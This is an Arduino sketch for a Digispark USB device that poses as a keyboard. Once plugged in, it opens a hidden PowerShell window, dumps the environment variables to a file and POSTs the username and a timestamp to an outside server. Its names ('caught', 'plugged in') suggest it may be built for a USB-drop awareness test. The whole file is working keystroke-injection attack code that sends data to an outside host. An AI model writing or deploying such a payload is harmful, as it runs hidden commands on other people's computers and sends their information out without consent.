#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -noexit -windowstyle hidden");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("mkdir c:\\tmp; echo \"utaknuti\" >> c:\\tmp\\proof.txt; gci env:* | sort-object name >> c:\\tmp\\proof.txt");
  DigiKeyboard.delay(50);
  DigiKeyboard.println("$params=@{\"ime\"=$env:UserName;\"metod\"=\"utaknuti\";\"vreme\"=Get-Date -Format ddMMyyHHmm};Invoke-WebRequest -Uri https://hakovan.si:8080/db/ulovljeni/ -Method POST -ContentType 'application/json' -Body ($params|ConvertTo-Json);");
  //sa ove dve linije odkomentarisane ne prepoznaje device.... SAMO sa tom linijom radi... u kompletu ne radi, ima dovoljno memorije
  //DigiKeyboard.delay(50);
  //DigiKeyboard.println("$ie=New-Object -com InternetExplorer.Application; $ie.visible=true; $ie.navigate(\"https://nepecaj.se\")");
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(3000);
}
